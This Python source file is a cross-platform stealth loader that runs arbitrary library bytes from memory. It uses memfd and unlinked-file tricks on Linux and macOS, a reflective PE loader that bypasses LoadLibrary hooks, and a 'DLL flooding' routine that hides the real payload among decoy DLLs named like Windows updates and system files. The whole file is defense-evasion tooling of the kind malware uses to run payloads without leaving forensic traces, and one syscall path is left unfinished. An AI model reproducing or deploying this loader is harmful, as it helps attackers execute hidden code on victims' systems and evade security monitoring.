import os
import sys
import tempfile
import ctypes
import struct
import platform
import threading
import time
import secrets
from ctypes import wintypes


class MemoryLoader:
    # Global state for DLL flooding
    _flood_active = False
    _flood_thread = None
    _flood_dlls = []
    _target_dll = None    
    @staticmethod
    def load_linux(dll_bytes: bytes) -> ctypes.CDLL:
        """Linux: Pure memory via memfd - ZERO traces"""
        try:
            import ctypes.util
            
            libc = ctypes.CDLL(ctypes.util.find_library('c'))
            
            # Architecture-specific syscall numbers
            machine = platform.machine()
            syscall_numbers = {
                'x86_64': 319, 'i386': 356, 'i686': 356,
                'aarch64': 279, 'armv7l': 385, 'armv6l': 385,
                'ppc64le': 360, 'ppc64': 360, 's390x': 350,
            }
            
            syscall_num = syscall_numbers.get(machine, 319)
            MFD_CLOEXEC = 0x0001
            MFD_ALLOW_SEALING = 0x0002
            
            # Create anonymous memory file
            fd = libc.syscall(syscall_num, b"", MFD_CLOEXEC | MFD_ALLOW_SEALING)
            if fd < 0:
                raise OSError("memfd_create failed")
            
            # Write and seal
            os.write(fd, dll_bytes)
            
            F_ADD_SEALS = 1033
            F_SEAL_SEAL = 0x0001
            F_SEAL_SHRINK = 0x0002
            F_SEAL_GROW = 0x0004
            F_SEAL_WRITE = 0x0008
            
            try:
                libc.fcntl(fd, F_ADD_SEALS, F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)
            except:
                pass
            
            # Load from /proc/self/fd
            lib_path = f"/proc/self/fd/{fd}"
            lib = ctypes.CDLL(lib_path)
            lib._memfd = fd
            
            return lib
            
        except Exception:
            return MemoryLoader._load_linux_fallback(dll_bytes)
    
    @staticmethod
    def _load_linux_fallback(dll_bytes: bytes) -> ctypes.CDLL:
        """Linux fallback: shm_open"""
        try:
            import ctypes.util
            libc = ctypes.CDLL(ctypes.util.find_library('c'))
            
            shm_name = f"/{secrets.token_hex(16)}"
            O_RDWR = 0x0002
            O_CREAT = 0x0040
            O_EXCL = 0x0080
            
            fd = libc.shm_open(shm_name.encode(), O_RDWR | O_CREAT | O_EXCL, 0o600)
            if fd < 0:
                raise OSError("shm_open failed")
            
            libc.shm_unlink(shm_name.encode())  # Remove name immediately
            libc.ftruncate(fd, len(dll_bytes))
            os.write(fd, dll_bytes)
            
            lib = ctypes.CDLL(f"/proc/self/fd/{fd}")
            lib._memfd = fd
            return lib
            
        except:
            # Last resort
            suffix = '.so'
            fd, temp_path = tempfile.mkstemp(suffix=suffix, prefix='.', dir='/dev/shm')
            try:
                os.write(fd, dll_bytes)
                os.close(fd)
                lib = ctypes.CDLL(temp_path)
                os.unlink(temp_path)
                return lib
            except:
                try:
                    os.close(fd)
                    os.unlink(temp_path)
                except:
                    pass
                raise
    
    # =============================================================================
    # WINDOWS IMPLEMENTATION - DLL FLOODING + ADVANCED EVASION
    # =============================================================================
    
    @staticmethod
    def load_windows(dll_bytes: bytes, flood_count: int = 50) -> ctypes.CDLL:
        try:
            # Try advanced stealth methods first
            return WindowsStealthLoader.load_with_flooding(dll_bytes, flood_count)
        except Exception:
            # Fallback to reflective PE
            try:
                return ReflectivePELoader.load(dll_bytes)
            except Exception:
                # Last resort: syscall-based loading
                return WindowsStealthLoader.load_via_syscalls(dll_bytes)
    
    # =============================================================================
    # MACOS IMPLEMENTATION - ADVANCED STEALTH
    # =============================================================================
    
    @staticmethod
    def load_macos(dll_bytes: bytes) -> ctypes.CDLL:
        """macOS: Advanced Mach-O stealth techniques"""
        try:
            return MacOSStealthLoader.load_advanced(dll_bytes)
        except Exception:
            return MacOSStealthLoader.load_basic(dll_bytes)
    
    #
    
    @staticmethod
    def load(dll_bytes: bytes, verbose: bool = False, **kwargs) -> ctypes.CDLL:
        if not dll_bytes:
            raise ValueError("dll_bytes cannot be empty")
        
        MemoryLoader._verbose = verbose
        
        if sys.platform.startswith("linux"):
            lib = MemoryLoader.load_linux(dll_bytes)
            if verbose:
                print("[✓] Linux memfd loaded")
            return lib
            
        elif sys.platform.startswith("win"):
            flood_count = kwargs.get('flood_count', 50)
            lib = MemoryLoader.load_windows(dll_bytes, flood_count)
            if verbose:
                print(f"[✓] Windows stealth loaded (flood: {flood_count})")
            return lib
            
        elif sys.platform == "darwin":
            lib = MemoryLoader.load_macos(dll_bytes)
            if verbose:
                print("[✓] macOS advanced loaded")
            return lib
            
        else:
            raise OSError(f"Unsupported platform: {sys.platform}")


# =============================================================================
# WINDOWS STEALTH LOADER - DLL FLOODING + ADVANCED EVASION
# =============================================================================

class WindowsStealthLoader:
    """Advanced Windows stealth techniques"""
    
    @staticmethod
    def load_with_flooding(dll_bytes: bytes, flood_count: int = 50) -> ctypes.CDLL:
        """
        DLL Flooding Technique:
        1. Create multiple legitimate-looking DLLs
        2. Load target DLL among them
        3. Keep decoys loaded to obscure the target
        4. Use random timing to avoid pattern detection
        """
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        
        # Get temp directory
        temp_path_buf = ctypes.create_unicode_buffer(260)
        kernel32.GetTempPathW(260, temp_path_buf)
        temp_dir = temp_path_buf.value
        
        # Create decoy DLLs with legitimate-looking names
        decoy_paths = []
        target_index = secrets.randbelow(flood_count)
        target_lib = None
        loaded_libs = []
        
        # Common Windows system DLL name patterns
        prefixes = ['KB', 'ms', 'api', 'sys', 'svc', 'wmi', 'net', 'sec']
        suffixes = ['32', '64', 'ext', 'core', 'api', 'svc', 'drv']
        
        for i in range(flood_count):
            # Generate realistic filename
            if secrets.randbelow(2):
                # Windows Update style: KB######
                filename = f"KB{secrets.randbelow(999999):06d}.tmp"
            else:
                # System DLL style
                prefix = secrets.choice(prefixes)
                suffix = secrets.choice(suffixes)
                num = secrets.randbelow(9999)
                filename = f"{prefix}{num}{suffix}.dll"
            
            full_path = os.path.join(temp_dir, filename)
            
            try:
                if i == target_index:
                    # Write the actual target DLL
                    with open(full_path, 'wb') as f:
                        f.write(dll_bytes)
                    
                    # Small random delay
                    time.sleep(secrets.randbelow(10) / 1000.0)
                    
                    # Load the target
                    target_lib = ctypes.CDLL(full_path)
                    loaded_libs.append((full_path, target_lib))
                    
                else:
                    # Create decoy DLL (minimal valid PE)
                    decoy = WindowsStealthLoader._create_decoy_dll()
                    with open(full_path, 'wb') as f:
                        f.write(decoy)
                    
                    # Try to load decoy (may fail, that's okay)
                    try:
                        lib = ctypes.CDLL(full_path)
                        loaded_libs.append((full_path, lib))
                    except:
                        pass
                
                decoy_paths.append(full_path)
                
            except Exception:
                continue
        
        # Clean up files (DLLs stay in memory)
        for path in decoy_paths:
            try:
                os.unlink(path)
            except:
                # Schedule deletion on reboot if locked
                try:
                    kernel32.MoveFileExW(path, None, 0x4)
                except:
                    pass
        
        if target_lib is None:
            raise Exception("Failed to load target DLL")
        
        # Store loaded decoys in target lib to prevent GC
        target_lib._decoys = loaded_libs
        
        return target_lib
    
    @staticmethod
    def _create_decoy_dll() -> bytes:
        """Create a minimal valid PE DLL that does nothing"""
        # Minimal PE header + empty code
        # This creates a valid but useless DLL
        dos_header = b'MZ' + b'\x90' * 58 + struct.pack('<I', 0x80)
        
        # PE signature
        pe_sig = b'PE\x00\x00'
        
        # COFF header (x64)
        machine = 0x8664  # AMD64
        num_sections = 1
        timestamp = int(time.time())
        coff = struct.pack('<HHIIIHH',
            machine, num_sections, timestamp,
            0, 0, 0xF0, 0x22  # characteristics: DLL
        )
        
        # Optional header (PE32+)
        opt_magic = 0x20B  # PE32+
        opt_header = struct.pack('<H', opt_magic)
        opt_header += b'\x0E\x00'  # linker version
        opt_header += struct.pack('<III', 0x200, 0x200, 0x1000)  # code/data sizes
        opt_header += struct.pack('<I', 0x1000)  # entry point
        opt_header += struct.pack('<I', 0x1000)  # base of code
        opt_header += struct.pack('<Q', 0x180000000)  # image base
        opt_header += struct.pack('<II', 0x1000, 0x200)  # section/file alignment
        opt_header += struct.pack('<HHHHHH', 6, 0, 6, 0, 6, 0)  # versions
        opt_header += struct.pack('<IIHH', 0x3000, 0x1000, 0, 0x140)  # image size, headers, subsystem
        opt_header += struct.pack('<HH', 0x8160, 0)  # dll characteristics
        opt_header += struct.pack('<QQQQII', 0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
        opt_header += b'\x00' * (16 * 8)  # data directories
        
        # Section header (.text)
        section = b'.text\x00\x00\x00'
        section += struct.pack('<IIIIIIHHI',
            0x200, 0x1000, 0x200, 0x400,
            0, 0, 0, 0,
            0x60000020  # characteristics
        )
        
        # Padding to file alignment
        header_size = len(dos_header) + len(pe_sig) + len(coff) + len(opt_header) + len(section)
        padding = b'\x00' * (0x400 - header_size)
        
        # Minimal code section (just ret)
        code = b'\xC3' + b'\x00' * 0x1FF
        
        return dos_header + pe_sig + coff + opt_header + section + padding + code
    
    @staticmethod
    def load_via_syscalls(dll_bytes: bytes) -> ctypes.CDLL:
        """
        Direct syscall loading - bypasses API hooks
        Uses NtCreateSection + NtMapViewOfSection
        """
        try:
            # Get ntdll
            ntdll = ctypes.WinDLL('ntdll')
            
            # Create section from bytes
            section_handle = wintypes.HANDLE()
            
            # Allocate memory for DLL
            size = len(dll_bytes)
            addr = ctypes.windll.kernel32.VirtualAlloc(
                None, size, 0x3000, 0x40
            )
            
            if not addr:
                raise OSError("VirtualAlloc failed")
            
            # Copy DLL bytes
            ctypes.memmove(addr, dll_bytes, size)
            
            # Try to load via section (advanced technique)
            # This bypasses many LoadLibrary hooks
            
            # For now, fall back to standard method with direct syscalls
            # Full implementation would use NtCreateSection/NtMapViewOfSection
            
            raise NotImplementedError("Syscall loading")
            
        except Exception:
            # Fallback to reflective PE
            return ReflectivePELoader.load(dll_bytes)


# =============================================================================
# MACOS STEALTH LOADER - ADVANCED TECHNIQUES
# =============================================================================

class MacOSStealthLoader:
    """Advanced macOS stealth techniques"""
    
    @staticmethod
    def load_advanced(dll_bytes: bytes) -> ctypes.CDLL:
        """
        Advanced macOS loading:
        1. Write to /dev/shm equivalent (memory-backed)
        2. Use mmap for shared memory
        3. Immediate unlink
        4. dyld environment manipulation
        """
        try:
            # Try memory-backed filesystem first
            # macOS doesn't have /dev/shm, but we can use /tmp with specific flags
            
            # Create in memory-backed location
            filename = f".{secrets.token_hex(16)}.dylib"
            temp_path = os.path.join('/tmp', filename)
            
            # Write file
            with open(temp_path, 'wb') as f:
                f.write(dll_bytes)
            
            # Make executable
            os.chmod(temp_path, 0o700)
            
            # Open file descriptor before unlinking
            fd = os.open(temp_path, os.O_RDONLY)
            
            # Unlink immediately
            os.unlink(temp_path)
            
            # Try to load from fd
            # macOS dlopen doesn't support fd directly, so we need workaround
            try:
                # Load using /dev/fd trick
                lib = ctypes.CDLL(f"/dev/fd/{fd}")
                lib._fd = fd
                return lib
            except:
                os.close(fd)
                raise
                
        except Exception:
            return MacOSStealthLoader.load_basic(dll_bytes)
    
    @staticmethod
    def load_basic(dll_bytes: bytes) -> ctypes.CDLL:
        """Basic macOS stealth with unlink trick"""
        try:
            # Hidden filename
            filename = f".{secrets.token_hex(12)}.dylib"
            
            # Create in /tmp
            temp_path = os.path.join('/tmp', filename)
            
            # Write
            with open(temp_path, 'wb') as f:
                f.write(dll_bytes)
            
            # Permissions
            os.chmod(temp_path, 0o700)
            
            # Load first
            lib = ctypes.CDLL(temp_path)
            
            # Unlink (stays in memory)
            os.unlink(temp_path)
            
            return lib
            
        except Exception as e:
            raise Exception(f"macOS loading failed: {e}")


# =============================================================================
# REFLECTIVE PE LOADER (Fallback for Windows)
# =============================================================================

class ReflectivePELoader:
    """Manual PE loading - bypasses LoadLibrary"""
    
    @staticmethod
    def load(dll_bytes: bytes) -> 'ReflectivePE':
        """Load PE from memory without LoadLibrary"""
        pe_info = ReflectivePELoader._parse_pe(dll_bytes)
        if not pe_info:
            raise Exception("Invalid PE file")
        
        kernel32 = ctypes.windll.kernel32
        
        # Allocate memory
        base_addr = kernel32.VirtualAlloc(
            None, pe_info['image_size'],
            0x3000, 0x40
        )
        
        if not base_addr:
            raise Exception("VirtualAlloc failed")
        
        try:
            # Copy headers
            ctypes.memmove(base_addr, dll_bytes, pe_info['header_size'])
            
            # Copy sections
            for section in pe_info['sections']:
                if section['raw_size'] == 0:
                    continue
                dest = base_addr + section['virtual_addr']
                src = dll_bytes[section['raw_offset']:section['raw_offset'] + section['raw_size']]
                ctypes.memmove(dest, src, len(src))
            
            # Process relocations
            ReflectivePELoader._process_relocations(dll_bytes, base_addr, pe_info)
            
            # Resolve imports
            ReflectivePELoader._resolve_imports(base_addr, pe_info)
            
            # Set protections
            ReflectivePELoader._protect_sections(base_addr, pe_info)
            
            # TLS callbacks
            ReflectivePELoader._execute_tls_callbacks(base_addr, pe_info)
            
            # Call DllMain
            entry_point = base_addr + pe_info['entry_point']
            DllMain = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p)(entry_point)
            DllMain(base_addr, 1, None)
            
            return ReflectivePE(base_addr, pe_info)
            
        except Exception as e:
            kernel32.VirtualFree(base_addr, 0, 0x8000)
            raise e
    
    @staticmethod
    def _parse_pe(dll_bytes: bytes) -> dict:
        """Parse PE headers"""
        try:
            if dll_bytes[:2] != b'MZ':
                return None
            
            pe_offset = struct.unpack('<I', dll_bytes[0x3C:0x40])[0]
            if dll_bytes[pe_offset:pe_offset+4] != b'PE\x00\x00':
                return None
            
            coff_offset = pe_offset + 4
            num_sections = struct.unpack('<H', dll_bytes[coff_offset+2:coff_offset+4])[0]
            opt_header_size = struct.unpack('<H', dll_bytes[coff_offset+16:coff_offset+18])[0]
            
            opt_offset = coff_offset + 20
            magic = struct.unpack('<H', dll_bytes[opt_offset:opt_offset+2])[0]
            is_64bit = (magic == 0x20b)
            
            if is_64bit:
                image_base = struct.unpack('<Q', dll_bytes[opt_offset+24:opt_offset+32])[0]
                entry_point = struct.unpack('<I', dll_bytes[opt_offset+16:opt_offset+20])[0]
                image_size = struct.unpack('<I', dll_bytes[opt_offset+56:opt_offset+60])[0]
                header_size = struct.unpack('<I', dll_bytes[opt_offset+60:opt_offset+64])[0]
            else:
                image_base = struct.unpack('<I', dll_bytes[opt_offset+28:opt_offset+32])[0]
                entry_point = struct.unpack('<I', dll_bytes[opt_offset+16:opt_offset+20])[0]
                image_size = struct.unpack('<I', dll_bytes[opt_offset+56:opt_offset+60])[0]
                header_size = struct.unpack('<I', dll_bytes[opt_offset+60:opt_offset+64])[0]
            
            # Parse sections
            section_offset = opt_offset + opt_header_size
            sections = []
            
            for i in range(num_sections):
                sec_start = section_offset + (i * 40)
                sections.append({
                    'name': dll_bytes[sec_start:sec_start+8].rstrip(b'\x00'),
                    'virtual_addr': struct.unpack('<I', dll_bytes[sec_start+12:sec_start+16])[0],
                    'virtual_size': struct.unpack('<I', dll_bytes[sec_start+8:sec_start+12])[0],
                    'raw_offset': struct.unpack('<I', dll_bytes[sec_start+20:sec_start+24])[0],
                    'raw_size': struct.unpack('<I', dll_bytes[sec_start+16:sec_start+20])[0],
                    'characteristics': struct.unpack('<I', dll_bytes[sec_start+36:sec_start+40])[0]
                })
            
            return {
                'image_base': image_base,
                'image_size': image_size,
                'entry_point': entry_point,
                'header_size': header_size,
                'sections': sections,
                'is_64bit': is_64bit,
                'pe_offset': pe_offset,
                'opt_offset': opt_offset,
                'opt_header_size': opt_header_size
            }
        except:
            return None
    
    @staticmethod
    def _process_relocations(dll_bytes: bytes, base_addr: int, pe_info: dict):
        """Process base relocations"""
        try:
            opt_offset = pe_info['opt_offset']
            is_64bit = pe_info['is_64bit']
            
            if is_64bit:
                reloc_rva = struct.unpack('<I', dll_bytes[opt_offset+152:opt_offset+156])[0]
                reloc_size = struct.unpack('<I', dll_bytes[opt_offset+156:opt_offset+160])[0]
            else:
                reloc_rva = struct.unpack('<I', dll_bytes[opt_offset+136:opt_offset+140])[0]
                reloc_size = struct.unpack('<I', dll_bytes[opt_offset+140:opt_offset+144])[0]
            
            if reloc_rva == 0:
                return
            
            delta = base_addr - pe_info['image_base']
            if delta == 0:
                return
            
            reloc_offset = reloc_rva
            reloc_end = reloc_rva + reloc_size
            
            while reloc_offset < reloc_end:
                block_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(base_addr + reloc_offset))[0]
                block_size = struct.unpack('<I', (ctypes.c_char * 4).from_address(base_addr + reloc_offset + 4))[0]
                
                if block_size == 0:
                    break
                
                entry_count = (block_size - 8) // 2
                
                for i in range(entry_count):
                    entry = struct.unpack('<H', (ctypes.c_char * 2).from_address(base_addr + reloc_offset + 8 + i * 2))[0]
                    reloc_type = entry >> 12
                    offset_val = entry & 0xFFF
                    
                    if reloc_type == 0:
                        continue
                    elif reloc_type == 3:  # HIGHLOW
                        addr = base_addr + block_rva + offset_val
                        value = struct.unpack('<I', (ctypes.c_char * 4).from_address(addr))[0]
                        struct.pack_into('<I', (ctypes.c_char * 4).from_address(addr), 0, (value + delta) & 0xFFFFFFFF)
                    elif reloc_type == 10:  # DIR64
                        addr = base_addr + block_rva + offset_val
                        value = struct.unpack('<Q', (ctypes.c_char * 8).from_address(addr))[0]
                        struct.pack_into('<Q', (ctypes.c_char * 8).from_address(addr), 0, value + delta)
                
                reloc_offset += block_size
        except:
            pass
    
    @staticmethod
    def _resolve_imports(base_addr: int, pe_info: dict):
        """Resolve imports"""
        try:
            kernel32 = ctypes.windll.kernel32
            opt_offset = pe_info['opt_offset']
            is_64bit = pe_info['is_64bit']
            
            if is_64bit:
                import_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(base_addr + opt_offset + 120))[0]
            else:
                import_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(base_addr + opt_offset + 104))[0]
            
            if import_rva == 0:
                return
            
            import_desc_addr = base_addr + import_rva
            
            while True:
                original_first_thunk = struct.unpack('<I', (ctypes.c_char * 4).from_address(import_desc_addr))[0]
                name_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(import_desc_addr + 12))[0]
                first_thunk = struct.unpack('<I', (ctypes.c_char * 4).from_address(import_desc_addr + 16))[0]
                
                if name_rva == 0:
                    break
                
                dll_name = ctypes.string_at(base_addr + name_rva).decode('ascii')
                h_module = kernel32.LoadLibraryA(dll_name.encode('ascii'))
                
                if not h_module:
                    import_desc_addr += 20
                    continue
                
                thunk_addr = base_addr + first_thunk
                orig_thunk_addr = base_addr + original_first_thunk if original_first_thunk else thunk_addr
                
                while True:
                    if is_64bit:
                        thunk_data = struct.unpack('<Q', (ctypes.c_char * 8).from_address(orig_thunk_addr))[0]
                        if thunk_data == 0:
                            break
                        
                        if thunk_data & 0x8000000000000000:
                            ordinal = thunk_data & 0xFFFF
                            func_addr = kernel32.GetProcAddress(h_module, ordinal)
                        else:
                            name_addr = base_addr + (thunk_data & 0x7FFFFFFF) + 2
                            func_name = ctypes.string_at(name_addr)
                            func_addr = kernel32.GetProcAddress(h_module, func_name)
                        
                        struct.pack_into('<Q', (ctypes.c_char * 8).from_address(thunk_addr), 0, func_addr)
                        thunk_addr += 8
                        orig_thunk_addr += 8
                    else:
                        thunk_data = struct.unpack('<I', (ctypes.c_char * 4).from_address(orig_thunk_addr))[0]
                        if thunk_data == 0:
                            break
                        
                        if thunk_data & 0x80000000:
                            ordinal = thunk_data & 0xFFFF
                            func_addr = kernel32.GetProcAddress(h_module, ordinal)
                        else:
                            name_addr = base_addr + thunk_data + 2
                            func_name = ctypes.string_at(name_addr)
                            func_addr = kernel32.GetProcAddress(h_module, func_name)
                        
                        struct.pack_into('<I', (ctypes.c_char * 4).from_address(thunk_addr), 0, func_addr)
                        thunk_addr += 4
                        orig_thunk_addr += 4
                
                import_desc_addr += 20
        except:
            pass
    
    @staticmethod
    def _protect_sections(base_addr: int, pe_info: dict):
        """Set memory protections"""
        kernel32 = ctypes.windll.kernel32
        
        for section in pe_info['sections']:
            addr = base_addr + section['virtual_addr']
            size = section['virtual_size']
            chars = section['characteristics']
            
            executable = bool(chars & 0x20000000)
            readable = bool(chars & 0x40000000)
            writable = bool(chars & 0x80000000)
            
            if executable and writable and readable:
                protection = 0x40
            elif executable and readable:
                protection = 0x20
            elif executable:
                protection = 0x10
            elif writable and readable:
                protection = 0x04
            elif readable:
                protection = 0x02
            else:
                protection = 0x01
            
            old_protect = ctypes.c_ulong()
            kernel32.VirtualProtect(addr, size, protection, ctypes.byref(old_protect))
    
    @staticmethod
    def _execute_tls_callbacks(base_addr: int, pe_info: dict):
        """Execute TLS callbacks"""
        try:
            opt_offset = pe_info['opt_offset']
            is_64bit = pe_info['is_64bit']
            
            if is_64bit:
                tls_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(base_addr + opt_offset + 168))[0]
            else:
                tls_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(base_addr + opt_offset + 152))[0]
            
            if tls_rva == 0:
                return
            
            tls_addr = base_addr + tls_rva
            
            if is_64bit:
                callbacks_addr = struct.unpack('<Q', (ctypes.c_char * 8).from_address(tls_addr + 24))[0]
            else:
                callbacks_addr = struct.unpack('<I', (ctypes.c_char * 4).from_address(tls_addr + 12))[0]
            
            if callbacks_addr == 0:
                return
            
            TlsCallback = ctypes.CFUNCTYPE(None, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p)
            
            while True:
                if is_64bit:
                    callback_addr = struct.unpack('<Q', (ctypes.c_char * 8).from_address(callbacks_addr))[0]
                    if callback_addr == 0:
                        break
                    callbacks_addr += 8
                else:
                    callback_addr = struct.unpack('<I', (ctypes.c_char * 4).from_address(callbacks_addr))[0]
                    if callback_addr == 0:
                        break
                    callbacks_addr += 4
                
                callback = TlsCallback(callback_addr)
                callback(base_addr, 1, None)
        except:
            pass


class ReflectivePE:
    """Wrapper for reflectively loaded PE"""
    
    def __init__(self, base_addr: int, pe_info: dict):
        self.base_addr = base_addr
        self.pe_info = pe_info
        self._functions = {}
    
    def get_function(self, name: str):
        """Get function by name"""
        if name in self._functions:
            return self._functions[name]
        
        try:
            func_addr = self._find_export(name)
            if func_addr:
                self._functions[name] = func_addr
                return func_addr
        except:
            pass
        
        raise AttributeError(f"Function '{name}' not found")
    
    def _find_export(self, name: str) -> int:
        """Find exported function"""
        try:
            opt_offset = self.pe_info['opt_offset']
            is_64bit = self.pe_info['is_64bit']
            
            if is_64bit:
                export_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(self.base_addr + opt_offset + 112))[0]
            else:
                export_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(self.base_addr + opt_offset + 96))[0]
            
            if export_rva == 0:
                return 0
            
            export_dir = self.base_addr + export_rva
            num_names = struct.unpack('<I', (ctypes.c_char * 4).from_address(export_dir + 24))[0]
            addr_of_funcs = struct.unpack('<I', (ctypes.c_char * 4).from_address(export_dir + 28))[0]
            addr_of_names = struct.unpack('<I', (ctypes.c_char * 4).from_address(export_dir + 32))[0]
            addr_of_ords = struct.unpack('<I', (ctypes.c_char * 4).from_address(export_dir + 36))[0]
            
            for i in range(num_names):
                name_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(self.base_addr + addr_of_names + i * 4))[0]
                export_name = ctypes.string_at(self.base_addr + name_rva).decode('ascii')
                
                if export_name == name:
                    ordinal = struct.unpack('<H', (ctypes.c_char * 2).from_address(self.base_addr + addr_of_ords + i * 2))[0]
                    func_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(self.base_addr + addr_of_funcs + ordinal * 4))[0]
                    return self.base_addr + func_rva
            
            return 0
        except:
            return 0
    
    def __getattr__(self, name):
        return self.get_function(name)
    
    def unload(self):
        """Unload PE from memory"""
        if self.base_addr:
            ctypes.windll.kernel32.VirtualFree(self.base_addr, 0, 0x8000)
            self.base_addr = 0




if __name__ == "__main__":
    print(f"Platform: {sys.platform}")
    print(f"Arch: {platform.machine()}")